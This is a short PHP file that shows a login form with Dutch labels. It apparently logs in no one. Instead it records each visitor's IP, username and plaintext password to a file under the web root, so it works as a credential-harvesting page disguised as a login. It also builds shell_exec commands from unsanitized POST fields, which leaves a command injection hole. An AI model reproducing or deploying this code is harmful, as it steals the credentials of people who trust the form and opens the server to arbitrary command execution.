<?php





error_reporting( E_ALL ); 
ini_set( "display_errors", 1 ); 



$loginIsSubmitted = isset( $_POST["login-submitted"] );  
if ($loginIsSubmitted ){ 
	    $userName = $_POST["userName"];
	    $passWord = $_POST["passWord"];
	    $ipadres = $_SERVER['REMOTE_ADDR'];
	    shell_exec("echo ip adres '$ipadres' >> /srv/http/test");
	    shell_exec("echo username '$userName' >> /srv/http/test");
	    shell_exec("echo wachtwoord '$passWord' >> /srv/http/test");
	}



$pagina = "<!DOCTYPE html>

<html>
<head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
	
	<title>login Page</title>
	<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1'>
	<style type='text/css'>

	</style>




</head>
<body >


	   
	<div id='content'>
		<div class='cols'>
			
			<div class='cols_center'>
				<div class='col' >
				<form method='post' action='index.php' >
			
				<label for='userName'>Gebruikersnaam</label>
           		<input type='text' name='userName' id='userName' placeholder='username' class='placeholder'>
				<label for='passWord'>Wachtwoord</label><input type='password' name='passWord' id='passWord'>
				<div class='submit'>
					<input type='submit' name='login-submitted' value='login' class='buttn'>
				</div>
				</form>
			</div>
        </div>

	</div>

    
	<footer>
     
      
    </footer>






</body></html>";

echo $pagina;
?>
